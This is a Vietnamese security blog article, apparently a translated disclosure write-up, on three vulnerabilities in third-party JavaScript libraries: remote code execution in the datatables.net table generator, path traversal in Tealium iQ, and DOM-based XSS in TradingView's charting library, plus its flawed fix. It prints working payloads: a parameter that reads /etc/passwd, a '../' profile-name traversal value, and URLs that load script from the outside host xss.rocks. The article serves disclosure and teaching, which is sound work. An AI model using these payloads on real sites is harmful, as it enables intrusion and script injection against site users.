* Một số lượng lớn các trang web sử dụng các thư viện JavaScript của bên thứ ba như một cách để tăng cường cho các chức năng của họ. Trong nhiều trường hợp, dữ liệu được tải lên trực tiếp từ domain của nhà cung cấp dịch vụ. Tuy nhiên, việc sử dụng các thư viện của bên thứ ba như một phần của website hoặc ứng dụng khiến nó dễ bị tấn công. Và dưới đây là ba ví dụ về các lỗ hổng như thế mà nó có thể đã ảnh hưởng đến hàng ngàn công ty.

# Ví Dụ 1: RCE in datatables.net
- Datatables.net cung cấp một thư viện miễn phí để hiển thị dữ liệu dưới dạng tables HTML. Trang chủ của datatables.net có đề xuất sử dụng thư viện online cdn.datatables.net.

![](https://images.viblo.asia/f1f808ef-485b-4ee1-9c04-6a7cc511f868.png)

- Điều này có nghĩa là rất nhiều trang web trên Internet sử dụng tài nguyên của cd.datatables.net làm nguồn tập lệnh của họ và trong trường hợp thỏa hiệp tài nguyên này, có thể có quyền truy cập vào tất cả các trang web này.

![](https://images.viblo.asia/c9f25670-a532-499f-924f-3db0a75fb330.png)

- Trong khi duyệt qua các dịch vụ thì đã phát hiện ra ứng dụng  https://editor.datatables.net/generator/ , cho phép tạo và test tùy chỉnh các tables bên phía backend. Mỗi khi một bảng mới được tạo, một tệp PHP mới được tạo trên server. Sử dụng một lỗ hổng trong việc lọc các tham số đầu vào để tạo tệp PHP, tôi có thể tạo lại cuộc tấn công RCE: một yêu cầu độc hại đã injection mã PHP tùy ý vào tệp được  tạo.

![](https://images.viblo.asia/4128b912-9281-4bc4-be2a-993cb34e0967.png)

- Khi nhấp vào liên kết của tệp dược tạo và thêm tham số **1=cat /etc/passwd**, nội dung của **/etc/passwd** tệp đã được lấy:

![](https://images.viblo.asia/5e6387e9-4b1b-45ab-9aac-582e62f68ec1.png)

- Nó đã được kiểm tra rằng lỗ hổng này có thể được sử dụng để truy cập các tệp trên  cdn.datatables.net , có khả năng cho phép khai thác lỗ hổng trên hơn một trăm nghìn trang web.


# Ví dụ 2: Path traversal in Tealium iQ
- Như trong ví dụ đầu tiên, dịch vụ này cũng yêu cầu sử dụng JavaScript từ tên miền của bên thứ ba.

![](https://images.viblo.asia/b3411323-0751-485a-a5ad-39623b20c494.png)

- Lỗ hổng này xảy ra do việc xử lý không cẩn thận dữ liệu của profile người dùng, dữ liệu nhận được từ người dùng nhập vào. Dưới đây là các tham số cơ bản được  Tealium iQ sử dụng để đăng dữ liệu profile trên tags.tiqcdn.com :

```
    https://tags.tiqcdn.com/utag/<Account Name>/<Profile Name>/prod/utag.js
```

- Vấn đề là Server cho phép các ký tự  `/` và `.` được sử dụng trong profile name. Những ký tự như vậy có thể được khai thác để thao tác với thư mục chứa profile. Chẳng hạn, trong trường hợp profile name có giá trị  `../../utag/uber/main`, mã JavaScript của hồ sơ riêng sẽ được tải lên  https://tags.tiqcdn.com/utag/uber/main/prod/utag.js và theo cách này, nó sẽ được nhúng trên bất kỳ trang web Uber nào sử dụng Tealium iQ.

- Lỗ hổng này đã được phát hiện và báo cáo như là một phần của Uber Bug Bounty và một chương trình Private Bug Bounty khác.

- Dưới đây là một khai thác thuận tiện có thể dễ dàng thay đổi nội dung của bất kỳ tệp .js nào tại  tags.tiqcdn.com .

![](https://images.viblo.asia/c63c7487-eb23-4cf5-930e-edd9c2fec71f.png)

# Ví dụ 3: DOM Based XSS in TradingView Charting Library
- Các [ TradingView Charting Library ](https://www.tradingview.com/HTML5-stock-forex-bitcoin-charting-library/) là thư viện rất phổ biến trên nển tảng thương mại điện tử. Hầu hết các sàn giao dịch tiền điện tử sử dụng thư viện này như một chức năng trong các dịch vụ của họ để hiển thị biểu đồ giao dịch trực tuyến. Vào ngày 24 tháng 9 năm 2018, dữ liệu về các lỗ hổng thư viện XSS có rủi ro cao đã được giới thiệu. 

- Bất kỳ ứng dụng web nào, sử dụng thư viện TrandingView trong các dịch vụ của mình, đều lưu trữ tệp HTML có thể truy cập công khai gọi là `tv-chart.html` trên máy chủ. Tập tin này được sử dụng để khởi tạo biểu đồ giao dịch thông qua các tham số location.hash . Kết quả của việc khởi tạo biểu đồ, iframe liên kết đến một trang sau đó tải lên trang.

    ```
    https://example.com/tradingview/en-tv-chart.x.html#symbol=BTC_ETH&interval=180&widgetbar=%7B%22details%22%3Afalse%2C%22watchlist%22%3Afalse%2C%22watchlist_settings%22%3A%7B%22default_symbols%22%3A%5B%5D%7D%7D&drawingsAccess=%7B%22type%22%3A%22black%22%7D&locale=en&uid=tradingview_36472&clientId=tradingview.com&userId=public_user&chartsStorageVer=1.0&debug=false&timezone=Asia%2FTaipei&theme=Dark
    ```
    
- Lỗ hổng nằm ở chức năng tải biểu đồ giao dịch của bên thứ ba. Hàm sử dụng một liên kết thu được từ đầu vào của người dùng tham số `indicatorsFile` và sau đó chuyển nó đến `$.getScript()`.

![](https://images.viblo.asia/9a1e006c-3b2b-4e85-8b0a-0b3135ccae82.png)

- Một liên kết dễ bị tấn công, thực thi mã Javascript tùy ý sẽ như sau:

    ```
        https://example.com/tradingview/en-tv-chart.x.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=//xss.rocks/xss.js
    ```

- Khi người dùng nhấp vào liên kết đó, đoạn mã sau sẽ được thực thi: xss.rocks/xss.js.

![](https://images.viblo.asia/5c24cd82-9102-413c-8370-f98d2436bef1.png)

- Sau khi lỗ hổng được công khai, TradingView đã phát hành phiên bản mới để fix nó. Chức năng, chịu trách nhiệm tải biểu đồ của bên thứ ba, đã được thay đổi. Phiên bản mới của chức năng này trong như sau.

![](https://images.viblo.asia/7d02df3d-69cf-4a7e-b6ec-40d4481b7bd9.png)

- Nhưng điều họ đã fix sai và lỗ hổng vẫn có thể được cho phép bằng tham số `customIndicatorsUrl` trong khi thêm tham số `uid=urlParams`.

    ```
    https://example.com/tradingview/en-tv-chart.x.html#disabledFeatures=[]&enabledFeatures=[]&customIndicatorsUrl=//xss.rocks/xss.js&uid=urlParams
    ```
    
- Tính đến thời điểm hiện tại thì một phiên bản mới đã được phát hành. Nó đã sửa chữa lỗ hổng hoàn toàn.

- Tất cả các nền tảng exchange, được bao gồm trong danh sách CoinMarketCap, đã được kiểm tra phiên bản thư viện dễ bị tấn công. Dô đó 90 dịch vụ exchange dễ bị tấn công đã được xác định, bao gồm cả những dịch vụ có khối lượng giao dịch hàng đầu. Tất cả các exchange dễ bị tấn công đã được thông báo về lỗ hổng.
    + 46 exchanges bỏ qua cảnh báo đó
    + 44 exchanges đã trả lời cảnh báo và yêu cầu dữ liệu kỹ thuật
    + 19 exchanges đã khắc phục lỗ hổng
    + 7 exchanges đề nghị phần thưởng

# Kết Luận
- Khi kiểm tra một ứng dụng web để bảo mật, bạn nên luôn luôn xem xét các sản phẩm của bên thứ ba được sử dụng, bởi vì trong nhiều trường hợp chúng vô cùng quan trọng.


-----



Nguồn : https://dmsec.io/hacking-thousands-of-websites-via-third-party-javascript-libraries/